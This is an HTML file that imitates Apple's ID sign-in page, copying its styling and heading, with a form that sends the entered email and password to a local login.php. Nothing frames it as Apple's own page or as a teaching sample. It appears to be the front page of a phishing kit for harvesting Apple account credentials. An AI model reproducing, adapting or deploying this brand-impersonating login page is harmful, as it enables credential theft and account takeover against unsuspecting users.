<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apple ID - Sign In</title>
  <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'SF Pro Display', sans-serif;
      background-color: #f5f5f7;
      color: #1d1d1f;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 50px 40px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    .apple-logo {
      text-align: center;
      font-size: 48px;
      margin-bottom: 20px;
    }
    h2 {
      text-align: center;
      font-weight: 600;
      margin-bottom: 25px;
    }
    input {
      width: 100%;
      padding: 15px;
      margin-bottom: 20px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      background-color: #fafafa;
    }
    button {
      width: 100%;
      padding: 15px;
      background: #0071e3;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background: #005bb5;
    }
    .link {
      margin-top: 15px;
      text-align: center;
      font-size: 14px;
      color: #555;
    }
    .link a {

      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="apple-logo"></div>
    <h2>Sign in with your Apple ID</h2>
    <form method="POST" action="login.php">
      <input type="email" name="email" placeholder="Apple ID" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">→</button>
    </form>
    <div class="link">
      <p><a href="forgot.html">Forgot Apple ID or password?</a></p>
    </div>
  </div>
</body>
</html>
